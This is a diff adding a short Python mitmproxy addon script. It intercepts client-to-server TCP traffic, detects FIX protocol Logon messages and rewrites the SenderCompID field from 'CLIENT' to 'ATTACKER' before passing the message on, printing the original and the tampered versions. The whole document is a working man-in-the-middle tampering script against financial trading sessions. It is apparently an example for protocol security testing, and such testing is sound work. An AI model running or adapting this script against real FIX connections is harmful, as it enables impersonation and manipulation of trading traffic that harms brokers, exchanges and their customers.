@@ -1,0 +1,23 @@
+from mitmproxy import tcp
+
+def tcp_message(flow: tcp.TCPFlow):
+    if flow.client_conn and flow.server_conn:
+        # Check if it's a client message going to server
+        if flow.messages and flow.messages[-1].from_client:
+            data = flow.messages[-1].content
+
+            # Decode to string for editing
+            try:
+                text = data.decode('ascii', errors='ignore')
+                if "35=A" in text:  # Just an example: look for FIX Logon
+                    print("Original FIX Message:\n", text)
+
+                    # Modify something — e.g., change SenderCompID (49=XXX)
+                    modified = text.replace("49=CLIENT", "49=ATTACKER")
+
+                    # Convert back to bytes and replace the content
+                    flow.messages[-1].content = modified.encode('ascii')
+                    print("Tampered FIX Message:\n", modified)
+
+            except Exception as e:
+                print("Error decoding FIX:", e)
